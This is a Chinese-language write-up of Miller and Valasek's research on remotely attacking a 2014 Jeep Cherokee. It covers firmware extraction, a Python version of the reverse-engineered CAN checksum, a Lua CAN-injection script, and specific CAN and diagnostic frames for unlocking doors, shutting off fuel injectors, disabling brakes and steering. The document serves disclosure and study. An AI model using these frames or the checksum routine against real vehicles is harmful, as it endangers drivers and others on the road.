
<img src="images/JeepUnlock-py.png">

需要说明的是，这里的 security access keys 不是攻击所必须的，分析 SecurityAccess 算法只是为了可以重新刷写 ECUs，但 Miller等人并未做更多探索。

下面分析泊车辅助功能（Parking Assist Module, PAM）。有了 wiTECH 这个工具，可以执行正向测试和监听结果。此外还发现了安全访问算法和密钥，使得 Miller 等人能够执行特权操作。然而，有此工具发出的消息是固定的，甚至不能使用一个校验和。实际 ECU 到 ECU 的通信，校验和事经常被使用的。如果希望发送篡改的CAN消息（不仅限于已有消息），需要理解这些校验和机制。为实现这一点，下面将分析一些与校验和相关的代码，这些代码通常在 ECUs内部。

多次监听 CAN 通信，可以得到类似速度、刹车比例及其他信息。此外，这些 CAN 消息在数据段段最后部分可能有一个校验和。例如，下面消息是从一台带有车道保持系统（LKA） 2010 Toyota Prius 监听到的：

```
IDH: 02, IDL: E4, Len: 05, Data: 98 00 00 00 83
IDH: 02, IDL: E4, Len: 05, Data: 9A 00 00 00 85
IDH: 02, IDL: E4, Len: 05, Data: 9E 00 00 00 89
```

每个消息的最后字节是一个 CAN ID、data length、数据字节等的整数加法校验和（限于 1 byte），仅看这几条消息，很难认识到这一点。Miller 认为大多数消息要么是纵向冗余校验（XOR校验和），要么是整数加法校验和，但泊车辅助模块（PAM）使用的校验和与我们所看到的不同。下面的信息是从2014年吉普切诺基的PAM发送的。

```
IDH: 02, IDL: 0C, Len: 04, Data: 80 00 06 7F
IDH: 02, IDL: 0C, Len: 04, Data: 80 00 08 D9
IDH: 02, IDL: 0C, Len: 04, Data: 80 00 19 09
```

这些来自PAM 的消息，看起来不匹配任何我们知道的 checksum 算法。那么如果获取了固件并逆向这段代码，可以识别这个校验码算法，并且有机会篡改消息使ECUs可以有效接收CAN消息。幸运地是wiTECH软件提供了所需的信息，需要购买 PAM 模块（可以从销售 MOPAR 处购买）。如下图所示：

<img src="images/jeepparkingassitmodule.png">

wiTECH还可用于更新 PAM，意味着固件可以从互联网上下载并存在本地计算上。在连接的计算机上运行wiTECH软件，可以发现一个目录 “‘%PROGRAMDATA%\wiTECH\jserver\userData\file\flashfiles”。 这个目录包含了缓存的固件，以免每次都要从网上重新下载固件。

在不了解这些固件文件和编码时，先尝试在执行两个ECUs刷写时进行CAN流量抓包。对比在刷写过程中收到的数据，可以推断出有一个文件用于升级 PAM 。在文件 5603899ah.efd 中查找字符串 “PAM”，有相应结果：

```
C:\Jeep\pam>strings 56038998ah.efd | grep PAM
PAM
PAM_CUSW SU
.\PAM_DSW\GEN\DSW09_PROJECT_gen\api\DTC_Mapping_MID_DTCID_PROJECT.h
.\PAM_DSW\GEN\DSW09_PROJECT_gen\api\DTC_Mapping_MID_DTCID_PROJECT.h
.\PAM_DSW\DSW_Adapter\src\DSW4BSW_PDM2NVM.c
```

文件名“56038998”与车上 PAM 模块的序列号 56038998AJ 很相似。所以通过名称也可以找到这个文件。这个文件不仅是一个固件镜像，而且包含了元数据，可用于wiTECH软件的其他功能。幸运地是，可以通过wiTECH提供的某写JARs调用某些功能来找到固件镜像确定的开始偏移和固件大小。在引入正确的类后，下列调用链揭示了真实的镜像开始偏移和大小：

```java
String user_file = "C:/Jeep/pam/56038998ah.efd";
UserFileImp ufi = new UserFileImp(user_file);
ff.load(ufi);
Microprocessor mps[] = ff.getMicroprocessors();
StandardMicroprocessor smp = (StandardMicroprocessor)mps[0];
LogicalBlock lb = smp.getLogicalBlocks()[0];

PhysicalBlockImp pb = (PhysicalBlockImp)lb.getPhysicalBlocks()[0];
System.out.println("Block Len: " + pb.getBlockLength());
System.out.println("Block len (uncomp): " + pb.getUncompressedBlockLength());
System.out.println("File Offset: " + pb.getFileOffset());
System.out.println("Start Address: " + pb.getStartAddress());
```

上面代码的输出如下：
```
Block Len: 733184
Block len (uncomp): 733184
File Offset: 3363
Start Address: 8192
```

现在我们有了编写一个提取固件的python脚本所需的信息并开始逆向分析固件。

接下来一个主要的问题在于我们不能确定PAM中的CPU架构，最好的办法是打开 PAM 封装并查看真实电路板上的标记。如果可以识别芯片标记，那么找出相应的处理器，之后就可以使用 IDA Pro进行逆向了。虽然PAM上的芯片很难看清，但主控MCU最终还是识别为 D70F3634，通过 google 搜索发现是一款 Renesas V850 芯片。很幸运，与之前车载信息系统中所用的是同款芯片，所以逆向脚本、技术、工具都可以重用。逆向PAM固件是希望发现计算 checksum 的具体算法。经过一番讨论，Miller 等人认为可能存在一些带有常数的异或操作，使得在有效负载非常相似时，校验和的值相差也很大。之后他们发现了一段包含 XOR 运算的循环结构：

<img src="images/pamchecksumalgorithm.png">

Miller等人先将这段汇报逆向为C，再由C转变为python 代码：
```python

def calc_checksum(data, length):
  end_index = length - 1
  index = 0
  checksum = 0xFF
  temp_chk = 0;
  bit_sum = 0;
  if(end_index <= index):
      return False
  for index in range(0, end_index):
      shift = 0x80
      curr = data[index]
      iterate = 8
      while(iterate > 0):
          iterate -= 1
          bit_sum = curr & shift;
          temp_chk = checksum & 0x80
          if (bit_sum != 0):
              bit_sum = 0x1C
              if (temp_chk != 0):
                  bit_sum = 1
              checksum = checksum << 1
              temp_chk = checksum | 1
              bit_sum ^= temp_chk
          else:
              if (temp_chk != 0):
                  bit_sum = 0x1D
              checksum = checksum << 1
              bit_sum ^= checksum
          checksum = bit_sum
          shift = shift >> 1
 return ~checksum & 0xFF
```

如果把来自 PAM 消息的3字节数据作为参数输入上面的函数，将得到正确的校验和。更为重要的是，所有在 Jeep‘s CAN 中看到的CAN消息，都包含了一个 1字节的校验和，这些checksum都使用了相同的算法。这样就得到了通用的校验和算法。事实上，还发现了另外两个校验和算法，与上面的类似但字节长度不同，在jeep这款车型中不常用。

当我们可以通过远程渗透在车内发送 CAN 消息，下一步就是查看哪些消息会真的影响车辆控制。Miller 等人在之前一整年的研究中梳理了发送给 Ford 和 Toyota 的消息类型，但对于 Jeep车型尚未梳理。为了证明远程攻击的效果，文中只尝试了少量可以控制车辆的消息。

车内的 CAN 消息通常分为两类：常规消息和诊断消息。常规消息在常规操作过程中均可在总线上发现；诊断消息仅用于对ECU进行测试时或非常规操作发生时可见。在 Miller 等人的报告中仅讨论了常规 CAN 消息。
- 转向信号
  - 转向信号在CAN-C网络上由ID为 “0x04F0” 的CAN消息控制。如果第一个字节为 01，会产生左转信号；如果第一个字节为 02，会产生右转信号。下面的LUA 脚本用于激活转向指示灯。

注意：这个脚本使用了 SPI 与V850芯片通信，所以 CAN ID 移动了2位，以适配硬件要求。

```lua
local clock = os.clock
function sleep(n) -- seconds
  local t0 = clock()
  while clock() - t0 <= n do end
end
ipc = require("ipc")
file = '/dev/ipc/ch7'
g = assert(ipc.open(file))
while true do
  -- can3 can2 can1 can0 data0
  g:write(0xf0, 0x02, 91, 0x07, 0x00, 0x00, 0xC0, 0x13, 0x01, 0x00, 0x00,0x00, 0x00, 0x00, 0x00) -- left turn
  sleep(.001)
end
```


- 门锁
  - 门锁与转向信号灯类似，它的消息 ID 为 05CE，而且在 CAN IHS 总线上。门锁控制CAN消息的数据部分是2字节长。如果第二个字节是 02，门锁锁闭；如果第二字节是 04 则门锁打开。
- RPMS
  - 转速表（tachometer）由ID为 01FC 的CAN-C总线消息控制。转向灯和门锁CAN消息由纯数据组成；而转速表的CAN消息不同，它还在最后两个字节包含了一个计数器（每消息递增）和一个校验和。例如：`IDH: 01, IDL: FC, Len: 08, Data: 07 47 4C C1 70 00 45 48`，数据区的前两个字节表示转速 RPM，在这个例子是 0x747，意味着 1863 RPMs。

诊断CAN消息比普通CAN消息功能更强，然而许多 ECUs 会在车辆行驶中（速度大约5～10mph）忽略诊断消息。因此，如果想借助诊断消息发起攻击，那么只能在车辆行驶很慢的时候进行，或者攻击者可以在执行攻击时伪造速度数据。Jeep 的诊断消息为29bit的CAN消息。

- 关闭引擎
  - 这一CAN消息由诊断工具的测试中得到。当开启一个诊断会话兵调用 “startRoutineByLocalIdentifier”时，本地标识为 15 且数据是 00 01。这一测试的目的是关闭特定的燃油注入器。这个消息的形式为：`EID: 18DA10F1, Len: 08, Data: 02 10 92 00 00 00 00 00`，之后调用形式：`EID: 18DA10F1, Len: 08, Data: 04 31 15 00 01 00 00 00`

- 非刹车
  - 2014 Jeep Cherokee 与 Ford Escap 有类似的地方，如果在车辆移动时一个诊断会话可被建立，那么可能会使刹车失效。这将是比较严重的安全问题，甚至在缓慢驾驶时。首先，我们需要与ABS ECU 启动一个诊断会话：`EID: 18DA28F1, Len: 08, Data: 02 10 03 00 00 00 00 00 `，然后我们使刹车失效，这是一个消息（InputOutput）但因为数据区台长所以要求多个CAN消息发送。

```
EID: 18DA28F1, Len: 08, Data: 10 11 2F 5A BF 03 64 64
EID: 18DA28F1, Len: 08, Data: 64 64 64 64 64 64 64 64
EID: 18DA28F1, Len: 08, Data: 64 64 64 00 00 00 00 00
```


- 转向
  - 转向（作为驻车辅助系统的一部分）和带防撞功能的制动等功能都使用正常的CAN信息进行操作。然而，不像先前分析过的车很难进行CAN消息注入，例如，在丰田普锐斯（Toyota Prius）中，要触发制动器，您只需向网络发送大量消息，指示防撞系统触发制动器。当然，真正的防撞系统是说不要踩刹车，因为没有必要这样做。丰田ABS ECU会在注入的信息和实际信息之间看到这种混淆，并以更高的频率对其看到的任何信息采取行动。因此，很容易使车辆触发制动器。在 Jeep Cherokee中，这些类型的功能并非如此。我们识别了防撞系统用于触发制动器的信息。然而，当我们发送它时，ECU收到我们发出的踩刹车信息和真实ECU发出的不踩刹车信息时，吉普车上的ABS ECU完全关闭了防撞功能。其目的是寻找这些类型的违规行为，而不是做出回应。这使得我们很难执行之前对丰田普锐斯所做的许多操作。
  - 作为我们如何绕过这一问题的一个例子，我们会让真正的ECU离线发送消息。然后，我们的消息是接收ECU会看到的唯一消息，因此不会出现混淆。缺点是我们用诊断信息使真正的ECU离线。这意味着我们只能以低速进行攻击，即使实际操作只涉及正常的can消息，因为我们首先需要使用诊断消息。
  - 我们以转向为例说明了这一点。在转向过程中，如果驻车辅助系统接收到冲突消息，则该系统将离线（实际上，车轮可能只移动一点，尤其是在车辆停止时，但要完全控制，需要遵循此步骤）。驻车辅助模块（PAM）是发送真实信息的ECU。因此，我们将PAM放入诊断会话，从而使其停止发送正常消息。然后我们发送信息来转动方向盘。

首先开启一个与 PAM 模块的诊断会话：
`EID: 18DAA0F1, Len: 08, Data: 02 10 02 00 00 00 00 00`

然后，发送CAN消息告诉动力转向ECU转向，这是一组CAN消息，类似下面示例：

`IDH: 02, IDL: 0C, Len: 04, Data: 90 32 28 1F `

上面前两个字节是应用到转向轮到扭矩（torque）值。C0 00 是逆时针（counter clockwise）转，40 00 意味着顺时针转。第三个字节的第一个半字节是自动驻车是否接合（0=否，2=是）；第二个半字节是一个计数器。最后一个字节是checksum。

发现总结：
- 2014年10月，Miller等人发现了D-Bus有可利用漏洞
- 2015年3月，发现了FCA，可以重编程V850芯片，能够从OMAP芯片向V850发送篡改后的CAN消息。
- 2015年5月，发现了D-Bus可以通过蜂窝网络进行访问，而不只是通过WiFi。
- 2015年7月，向FCA、Harman/Kardon。NHTSA和QNX提供了这份报告。
- 2015年7月16日，chrysler发布了补丁
- 2015年7月24日，Sprint 蜂窝网络封堵了端口6667，Chrysler 召回 140万台车辆。

补丁与风险缓解：
- Chrysler公司推出了一个修复补丁，可在15.26.1版本上可见。
- Sprint 蜂窝网络封堵了端口6667

Miller 的报告总结了研究团队三年来汽车安全研究的成果。在这篇文章中，演示了一种可以对许多菲亚特-克莱斯勒汽车执行的远程攻击。易受攻击的车辆数量达数十万辆，这迫使FCA召回了140万辆汽车，并改变了Sprint运营商网络。这种远程攻击可针对位于美国任何地方的车辆进行，无需攻击者或驾驶员对车辆进行修改或进行物理交互。远程攻击会影响某些物理系统，如转向和制动。我们提供这项研究的目的是希望我们能够学会在未来制造更安全的车辆，以便驾驶员能够相信自己在驾驶过程中不会受到网络攻击。制造商、供应商和安全研究人员可以利用这些信息继续调查吉普切诺基和其他车辆，以确保现代汽车的安全。